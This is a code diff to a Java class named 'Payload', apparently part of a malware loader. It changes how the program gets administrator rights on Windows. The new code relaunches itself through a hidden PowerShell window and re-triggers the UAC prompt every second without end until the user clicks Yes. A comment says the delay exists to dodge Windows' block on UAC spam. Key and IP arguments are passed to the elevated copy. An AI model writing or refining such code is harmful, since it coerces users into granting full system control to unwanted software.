@@ -30,18 +30,14 @@ public class Payload {
 
             if (!isAdmin()) {
                 log("Not admin. Starting UAC...");
-                boolean accepted = askForAdmin(key, ip);
-                
-                if (accepted) {
-                    log("UAC Accepted. Parent exiting.");
-                    System.exit(0);
-                } else {
-                    log("UAC Denied. Retrying...");
-                    while (!askForAdmin(key, ip)) {
-                        log("UAC Denied again. Retrying...");
+                while (true) {
+                    boolean accepted = askForAdmin(key, ip);
+                    if (accepted) {
+                        log("UAC Accepted. Parent exiting.");
+                        System.exit(0);
                     }
-                    log("UAC Accepted on retry. Parent exiting.");
-                    System.exit(0);
+                    log("UAC Denied. Waiting 1s before retrying...");
+                    Thread.sleep(1000); // 1 second pause to prevent Windows UAC spam block
                 }
             } else {
                 log("We are Admin! Proceeding.");
@@ -57,25 +53,30 @@ public class Payload {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javaExe = javaHome + "\\bin\\javaw.exe";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
-            
-            log("Triggering UAC via PowerShell...");
-            
+            File lockFile = new File(getLoaderDir(), ".lock");
+
+            // Create the lock file BEFORE triggering UAC
+            FileOutputStream lockStream = new FileOutputStream(lockFile);
+
             String psCommand = String.format(
                 "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
                 javaExe, jarPath, key, ip
             );
 
-            // Launch PowerShell hidden and wait for the user to click Yes or No
+            log("Triggering UAC via PowerShell...");
             Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
             p.waitFor();
             
-            // After PowerShell closes, check if the elevated process actually deleted the lock file
-            File lockFile = new File(getLoaderDir(), ".lock");
-            if (!lockFile.exists()) {
-                return true;
-            }
+            // If the user clicked Yes, the elevated process starts and deletes the lock file
+            boolean accepted = !lockFile.exists();
             
-            return false;
+            // Clean up the lock file if it's still there
+            if (lockFile.exists()) {
+                lockFile.delete();
+            }
+            lockStream.close();
+            
+            return accepted;
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
             return false;
